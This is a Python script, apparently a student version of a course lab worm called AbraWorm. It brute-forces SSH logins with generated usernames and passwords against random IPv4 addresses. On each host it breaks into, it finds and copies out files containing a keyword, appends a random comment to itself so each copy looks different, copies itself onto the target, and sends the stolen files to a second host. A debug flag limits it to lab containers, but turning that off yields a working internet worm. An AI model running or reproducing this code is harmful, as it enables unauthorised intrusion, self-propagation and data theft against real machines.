#!/usr/bin/env python

import sys
import os
import random
import paramiko
import scp
import select
import signal
import string
import subprocess

#changed
def generate_random_string(length):
    # Define the characters to choose from for the random string
    characters = string.ascii_letters + string.digits + string.punctuation
    
    # Generate the random string using random.choices()
    random_string = ''.join(random.choices(characters, k=length))
    
    return random_string

##   You would want to uncomment the following two lines for the worm to 
##   work silently:
#sys.stdout = open(os.devnull, 'w')
#sys.stderr = open(os.devnull, 'w')

def sig_handler(signum,frame): os.kill(os.getpid(),signal.SIGKILL)
signal.signal(signal.SIGINT, sig_handler)

debug = 1     # IMPORTANT:  Before changing this setting, read the last
               #             paragraph of the main comment block above. As
               #             mentioned there, you need to provide two IP
               #             addresses in order to run this code in debug 
               #             mode. 

##  The following numbers do NOT mean that the worm will attack only 3
##  hosts for 3 different usernames and 3 different passwords.  Since the
##  worm operates in an infinite loop, at each iteration, it generates a
##  fresh batch of hosts, usernames, and passwords.
NHOSTS = NUSERNAMES = NPASSWDS = 3


##  The trigrams and digrams are used for syntheizing plausible looking
##  usernames and passwords.  See the subroutines at the end of this script
##  for how usernames and passwords are generated by the worm.
trigrams = '''bad bag bal bak bam ban bap bar bas bat bed beg ben bet beu bum 
                  bus but buz cam cat ced cel cin cid cip cir con cod cos cop 
                  cub cut cud cun dak dan doc dog dom dop dor dot dov dow fab 
                  faq fat for fuk gab jab jad jam jap jad jas jew koo kee kil 
                  kim kin kip kir kis kit kix laf lad laf lag led leg lem len 
                  let nab nac nad nag nal nam nan nap nar nas nat oda ode odi 
                  odo ogo oho ojo oko omo out paa pab pac pad paf pag paj pak 
                  pal pam pap par pas pat pek pem pet qik rab rob rik rom sab 
                  sad sag sak sam sap sas sat sit sid sic six tab tad tom tod 
                  wad was wot xin zap zuk'''

digrams = '''al an ar as at ba bo cu da de do ed ea en er es et go gu ha hi 
              ho hu in is it le of on ou or ra re ti to te sa se si ve ur'''

trigrams = trigrams.split()
digrams  = digrams.split()

def get_new_usernames(how_many):
    if debug: return ['root']      # need a working username for debugging
    if how_many == 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    usernames = [''.join(map(lambda x: random.sample(trigrams,1)[0] 
          if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return usernames

def get_new_passwds(how_many):
    if debug: return ['mypassword']      # need a working username for debugging
    if how_many == 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    passwds = [ ''.join(map(lambda x:  random.sample(trigrams,1)[0] + (str(random.randint(0,9)) 
                if random.random() > 0.5 else '') if int(selector[x]) == 1 
                        else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return passwds

def get_fresh_ipaddresses(how_many):
    if debug: return ['172.17.0.5'] #4th container   
                    # Provide one or more IP address that you
                    # want `attacked' for debugging purposes.
                    # The usrname and password you provided
                    # in the previous two functions must
                    # work on these hosts.
    if how_many == 0: return 0
    ipaddresses = []
    for i in range(how_many):
        first,second,third,fourth = map(lambda x: str(1 + random.randint(0,x)), [223,223,223,223])
        ipaddresses.append( first + '.' + second + '.' + third + '.' + fourth )
    return ipaddresses 

#change
def traverse_all(traversed_all_file,list_of_raw_file_names,files_of_interest_at_target,ssh, root_directory):
    # Execute 'ls' command to list all entries (files and directories) in the current directory
    stdin, stdout, stderr = ssh.exec_command(f'ls {root_directory}')
    entries = stdout.read().decode().splitlines()
    #print("entries: ",entries)
    for entry in entries:
        # Get the full path of the current entry
        entry_path = root_directory + '/' + entry
        if(entry_path[0] == '/'):
            entry_path = entry_path[1:]

        stdin, stdout, stderr = ssh.exec_command(f'test -d {entry_path} && echo "YES" || echo "NO"')
        is_directory = stdout.read().decode().strip()

        if is_directory == 'YES':
            # Recursively traverse the subdirectory
            traverse_all(traversed_all_file,list_of_raw_file_names,files_of_interest_at_target,ssh, entry_path)
        else : #if the entry_path is a file then we will look for the files containing "abracadabra"
            stdin, stdout, stderr = ssh.exec_command(f'grep abracadabra {entry_path} && echo "YES" || echo "NO"')
            is_targetfile = stdout.read().decode().strip()

            traversed_all_file.append(entry_path)

            if is_targetfile == 'NO':
                continue
            else:
                #for example if "entry_path = root/dir1/file3.txt" then we need to get the only "file3.txt".thats what
                #are doing below
                path_files = entry_path.split('/')
                list_of_raw_file_names.append(path_files[len(path_files)-1])    
                files_of_interest_at_target.append(entry_path)

        # Process the file or directory here (replace with your desired code)
    return traversed_all_file,list_of_raw_file_names,files_of_interest_at_target



while True:
    usernames = get_new_usernames(NUSERNAMES)
    passwds =   get_new_passwds(NPASSWDS)
#    print("usernames: %s" % str(usernames))
#    print("passwords: %s" % str(passwds))
    # First loop over passwords
    for passwd in passwds:
        # Then loop over user names
        for user in usernames:
            # And, finally, loop over randomly chosen IP addresses
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                print("\nTrying password %s for user %s at IP address: %s" % (passwd,user,ip_address))
                files_of_interest_at_target = []
                list_of_raw_file_names = []
                traversed_all_file=[]
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip_address,port=22,username=user,password=passwd,timeout=5)
                    print("\n\nconnected\n")
                    
                    traversed_all_file,list_of_raw_file_names,files_of_interest_at_target = traverse_all(
                        traversed_all_file,list_of_raw_file_names,files_of_interest_at_target,ssh,'')

                    #"files_of_interest_at_target_in_byte" is needed to get the target files from remote machine to
                    #host machine
                    files_of_interest_at_target_in_byte = list(map(lambda x: x.encode('utf-8'), files_of_interest_at_target))

                    #"list_of_raw_file_names_in_byte" is needed to send the target files to another remote machine from
                    #host machine
                    list_of_raw_file_names_in_byte = list(map(lambda x: x.encode('utf-8'), list_of_raw_file_names))

                    #"traversed_all_file_in_byte" is needed to just show the traversed file on console

                    traversed_all_file_in_byte = list(map(lambda x: x.encode('utf-8'), traversed_all_file))

                    print("Traversed files :",traversed_all_file_in_byte)
                    print()
                    print("Interested Target Files:",files_of_interest_at_target_in_byte)
                    print()

                    scpcon = scp.SCPClient(ssh.get_transport())
                    if len(files_of_interest_at_target_in_byte) > 0:
                        for target_file in files_of_interest_at_target_in_byte:
                            scpcon.get(target_file) #here get() takes a "byte" type as argument

                    # changed
                    running_file_IN = open(sys.argv[0], 'r')
                    code = running_file_IN.readlines()
                   
                    new_comment_line = "#This is a extra comment: "+generate_random_string(6)+'\n'
                    code.append(new_comment_line)

                    modified_code = ""
                    for line in code:
                        modified_code = modified_code + line

                    with open('Abraworm.py','w') as file:
                        file.write(modified_code)

                   
                    print("worm file is modified before hopping")

                    # Now deposit a copy of AbraWorm.py at the target host:
                    scpcon.put('Abraworm.py')   
                    scpcon.close()

                    #removing the temporary changed file
                    try:
                        subprocess.run(['rm', '-f', 'Abraworm.py'], check=True)
                    except subprocess.CalledProcessError as e:
                        print("Error")

                    
                except Exception as e:
                    print(e)
                    continue
                # Now upload the exfiltrated files to a specially designated host,
                # which can be a previously infected host.  The worm will only 
                # use those previously infected hosts as destinations for 
                # exfiltrated files if it was able to send the login credentials
                # used on those hosts to its human masters through, say, a 
                # secret IRC channel. (See Lecture 29 on IRC)
                if len(files_of_interest_at_target) > 0:
                    print("\nWill now try to exfiltrate the files")
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        #  For exfiltration demo to work, you must provide an IP address and the login 
                        #  credentials in the next statement:
                        ip_address_of_another_machine = '172.17.0.6'
                        ssh.connect(ip_address_of_another_machine,port=22,username='root',password='mypassword',timeout=5) #5th container
                        scpcon = scp.SCPClient(ssh.get_transport())
                        print("\n\nconnected to exhiltration host\n")
                        for filename in list_of_raw_file_names_in_byte:
                            scpcon.put(filename)
                        scpcon.close()
                        print("\n\n all target files are sent to ",ip_address_of_another_machine)
                    except Exception as e:
                        print(e) 
                        print("No uploading of exfiltrated files\n")
                        continue
    if debug: break
